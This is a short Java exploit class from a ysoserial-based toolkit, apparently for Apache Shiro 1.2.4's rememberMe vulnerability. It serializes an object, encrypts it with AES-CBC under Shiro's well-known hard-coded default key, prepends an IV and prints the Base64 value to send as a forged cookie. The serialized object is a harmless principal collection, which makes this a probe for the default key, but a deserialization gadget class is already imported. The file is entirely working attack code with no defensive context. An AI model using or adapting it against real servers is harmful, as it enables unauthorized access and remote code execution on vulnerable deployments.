package ysoserial.exploit;

import org.apache.shiro.subject.SimplePrincipalCollection;
import ysoserial.payloads.CommonsBeanutils1;

import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.Key;
import java.security.SecureRandom;
import java.security.spec.AlgorithmParameterSpec;
import java.security.spec.KeySpec;
import java.util.Base64;
import java.util.HashMap;

import static sun.security.jca.JCAUtil.getSecureRandom;

/*
*
* */
public class Pan_Shiro {
    public static void main(String[] args) throws Exception{
        //ENcrypt moad in shiro 1.2.4 default
        String transformationString = "AES/CBC/PKCS5Padding";
        String transformation = "AES";
        int encryptMode = 1;

        Object object = new SimplePrincipalCollection();

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();

        //Cipher key
        byte[] cipherKey = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        //iv
        int ivSize = 16;
        byte[] ivBytes = new byte[ivSize];
        SecureRandom random = getSecureRandom();
        random.nextBytes(ivBytes);

        //generate Cipher
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(transformationString);
        SecretKeySpec secretKeySpec = new SecretKeySpec(cipherKey, transformation);
        IvParameterSpec ivParameterSpec = new IvParameterSpec(ivBytes);
        cipher.init(encryptMode, secretKeySpec, ivParameterSpec);
        byte[] cipherBytes = cipher.doFinal(byteArrayOutputStream.toByteArray());

        //Componet iv and cipher bytes
        byte[] resultBytes = new byte[ivBytes.length + cipherBytes.length];
        // arraycopy args: srcBytes srcbytesPosition destBytes destBytesPosition writeLength
        System.arraycopy(ivBytes, 0 ,resultBytes, 0, ivBytes.length);
        System.arraycopy(cipherBytes, 0 ,resultBytes, ivBytes.length, cipherBytes.length);

        //Base64 encode the results bytes
        byte[] encode = java.util.Base64.getEncoder().encode(resultBytes);
        System.out.println(new String(encode));
    }
}
